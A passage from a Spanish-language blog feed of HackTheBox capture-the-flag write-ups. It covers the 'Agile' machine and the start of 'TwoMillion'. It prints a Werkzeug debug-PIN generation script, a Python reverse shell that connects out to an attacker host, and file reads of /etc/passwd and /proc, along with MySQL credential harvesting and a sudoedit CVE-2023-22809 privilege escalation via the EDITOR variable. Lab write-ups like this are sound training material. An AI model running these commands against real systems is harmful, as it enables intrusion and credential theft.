Si vemos bien, la aplicacion fuerza un &lt;strong&gt;debugger&lt;/strong&gt; y vemos que parece mostrar un parametro llamativo: &lt;strong&gt;cmd=resource&lt;/strong&gt;
&lt;img src=&quot;/assets/img/HTB_Agile/A8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A9.png&quot; alt=&quot;&quot; /&gt;
Si vemos, este error permite activar el debugger… Y abrir una “terminal”” desde la pagina, pero nos pedira un &lt;strong&gt;PIN&lt;/strong&gt;, por lo que aqui entra una vulnerabilidad del modo debug.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Si vemos, se usa Python 3.10&lt;/li&gt;
  &lt;li&gt;Emplea &lt;strong&gt;flask&lt;/strong&gt; y podemos ver la ruta de la &lt;strong&gt;app.py&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Vemos que tiene el modo &lt;strong&gt;debug&lt;/strong&gt; activo&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si quieres tener un poco mas detallado esto, te sugiero que entres al siguiente enlace:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug&quot;&gt;HackTricks&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;obteniendo-el-pin&quot;&gt;Obteniendo el PIN&lt;/h3&gt;

&lt;p&gt;Para explotar esta vulnerabilidad, tendremos que asegurarnos de tener los siguientes datos:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;El modo debug esta &lt;strong&gt;activo&lt;/strong&gt; (✓)&lt;/li&gt;
  &lt;li&gt;Username: En este caso es &lt;strong&gt;www-data&lt;/strong&gt;, que obtenemos al apuntar al /etc/passwd (✓)&lt;/li&gt;
  &lt;li&gt;“modname”, en este caso es &lt;strong&gt;flask.app&lt;/strong&gt; (✓)&lt;/li&gt;
  &lt;li&gt;El nombre de la APP es: &lt;strong&gt;“wsgi_app”&lt;/strong&gt; (✓)&lt;/li&gt;
  &lt;li&gt;“uuid.getnode”, Este tendremos que obtenerlo&lt;/li&gt;
  &lt;li&gt;“machine.id()”, el ID de la maquina, tambien tendremos que obtenerlo&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;obteniendo-el-uuidgetnode&quot;&gt;Obteniendo el uuid.getnode&lt;/h4&gt;

&lt;p&gt;Si leemos la documentacion de &lt;a href=&quot;https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug&quot;&gt;HackTricks&lt;/a&gt;, nos indica que primero tendremos que obtener la interfaz de red, apuntando al binario del sistema &lt;strong&gt;/proc/net/arp&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez obtenida la interfaz de red: &lt;strong&gt;eth0&lt;/strong&gt;, vamos a apuntar a la direccion:
&lt;strong&gt;sys/class/net/&amp;lt;device id&amp;gt;/address&lt;/strong&gt;
&lt;img src=&quot;/assets/img/HTB_Agile/A11.png&quot; alt=&quot;&quot; /&gt;
Por lo que nos quedaria transformar esa direccion &lt;strong&gt;hexagesimal&lt;/strong&gt; al sistema decimal, esto lo podemos hacer con Python:&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Direccion&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;obteniendo-el-machine-id&quot;&gt;Obteniendo el Machine ID:&lt;/h4&gt;

&lt;p&gt;Para esto, apuntamos a la ruta: &lt;strong&gt;/proc/sys/kernel/random/boot_id&lt;/strong&gt;
&lt;img src=&quot;/assets/img/HTB_Agile/A13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;obteniendo-el-pin-1&quot;&gt;Obteniendo el Pin:&lt;/h3&gt;

&lt;p&gt;Si nos guiamos del codigo brindado por la misma documentacion de HackTricks:&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hashlib&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;itertools&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;probably_public_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'web3_user'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# username&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'flask.app'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# modname&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'Flask'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# getattr(app, '__name__', getattr(app.__class__, '__name__'))&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'/usr/local/lib/python3.5/dist-packages/flask/app.py'&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# getattr(mod, '__file__', None),&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;private_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'UUID'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# str(uuid.getnode()),  /sys/class/net/ens33/address&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'MACHINE ID'&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# get_machine_id(), /etc/machine-id&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sha1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;probably_public_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;private_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isinstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cookiesalt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#h.update(b'shittysalt')&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;cookie_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__wzd'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'pinsalt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%09&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;group_size&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;group_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'-'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;group_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rjust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                          &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;group_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Tendriamos que ejecutarlo con nuestros parametros y obtener el codigo &lt;strong&gt;PIN&lt;/strong&gt;, para habilitar la consola en el modo &lt;strong&gt;debug&lt;/strong&gt;, dentro de la pagina.&lt;/p&gt;

&lt;p&gt;Procedemos a ver si podemos ejecutar comandos de forma remota y de paso a asegurar si podemos efectuar conexiones remotas:
&lt;img src=&quot;/assets/img/HTB_Agile/A14.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/HTB_Agile/A15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como podemos comprobar que si, vamos a tirarnos una reverse shell:&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1234&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)];&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;spawn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A16.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/HTB_Agile/A17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Viendo conexiones, podemos toparnos con un servicio &lt;strong&gt;MySql&lt;/strong&gt;, asi que iremos a buscar archivos que nos interesen… Vemos que existe un directorio &lt;strong&gt;app&lt;/strong&gt; dentro de la raiz del sistema, donde encontraremos las credenciales para logearnos al servicio MySQL&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si analizamos la Database: &lt;strong&gt;SUPERPASS&lt;/strong&gt;, podemos encontrarnos con los usuarios y las passwords hasheadas:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez obtenemos las credenciales del usuario: &lt;strong&gt;CORUM&lt;/strong&gt;, entramos por SSH
&lt;img src=&quot;/assets/img/HTB_Agile/A20.png&quot; alt=&quot;&quot; /&gt;
Si vemos el estado de la red nos toparemos con un puerto interesante, el &lt;strong&gt;41829&lt;/strong&gt; (Un puerto usado por Google Chrome)
&lt;img src=&quot;/assets/img/HTB_Agile/A21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Solo nos quedaria hacer port forwarding a nuestra maquina, podemos usar &lt;strong&gt;CHISEL&lt;/strong&gt;, pero yo lo hare con SSH
&lt;img src=&quot;/assets/img/HTB_Agile/A22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si recordamos, cuando hicimos un LFI, dentro del error, podiamos ver el codigo de la app, dentro de esta existe un error que retorna la password del usuario:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si usamos el propio &lt;strong&gt;Google Chrome&lt;/strong&gt; para efectuar el port forwarding, veremos lo siguiente:
&lt;img src=&quot;/assets/img/HTB_Agile/A24.png&quot; alt=&quot;&quot; /&gt;
Por lo que vemos que hay un dominio &lt;strong&gt;test.superpass.htb&lt;/strong&gt;, atentamos el codigo defectuoso con el que nos topamos  y obtendremos la clase del usuario &lt;strong&gt;edwards&lt;/strong&gt;
&lt;img src=&quot;/assets/img/HTB_Agile/A25.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/HTB_Agile/A26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora, si buscamos privilegios a nivel de &lt;strong&gt;SUDOERS&lt;/strong&gt;, nos toparemos con lo siguiente:
&lt;img src=&quot;/assets/img/HTB_Agile/A27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si buscamos algun exploit con el binario &lt;strong&gt;“sudoedit”&lt;/strong&gt;, nos toparemos con el &lt;strong&gt;[CVE-2023-22809]&lt;/strong&gt;, este nos indica que necesitaremos una variable de entorno… Por lo que usaremos la herramienta &lt;strong&gt;PSPY64&lt;/strong&gt; para hallarla.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Por lo que nos quedaria explotar esto a nuestro favor usando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;EDITOR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;vim -- /app/venv/bin/activate&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Seguido de:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; dev_admin sudoedit /app/config_test.json 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Le asignamos permisos a la bash y con esto concluiriamos la machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Agile/A31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;fin&quot;&gt;FIN&lt;/h2&gt;</content><author><name>Al3xt0r</name></author><category term="CTF" /><category term="HTB" /><category term="Linux" /><category term="Medium" /><summary></summary></entry><entry><title>HTB - TwoMillion</title><link href="http://localhost:4000/HTB-TwoMillion/" rel="alternate" type="text/html" title="HTB - TwoMillion" /><published>2023-07-23T00:00:00-05:00</published><updated>2023-07-23T00:00:00-05:00</updated><id>http://localhost:4000/HTB-TwoMillion</id><content type="html" xml:base="http://localhost:4000/HTB-TwoMillion/">&lt;h2 id=&quot;begin&quot;&gt;Begin&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM0.png&quot; alt=&quot;&quot; /&gt;
Esta maquina es un tanto interesante, pese a ser easy… Tiene unos conceptos de explotacion de Kernel llamativo.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Lista de lo que veremos en esta machine:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Reconocimiento de puertos&lt;/li&gt;
  &lt;li&gt;Explotacion de vulnerabilidades del kernel&lt;/li&gt;
  &lt;li&gt;Javascript functions&lt;/li&gt;
  &lt;li&gt;RCE vulnerando la API&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h2&gt;

&lt;p&gt;Usamos los scripts de &lt;strong&gt;reconocimiento&lt;/strong&gt; con la herramienta &lt;strong&gt;nmap&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 65535 &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &amp;lt;IP&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;O tambien podemos usar:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &amp;lt;IP de la Maquina&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Y para agilizar trabajo, usaremos los puertos descubiertos para obtener informacion de los servicios y versiones que estan tras estos:&lt;/p&gt;

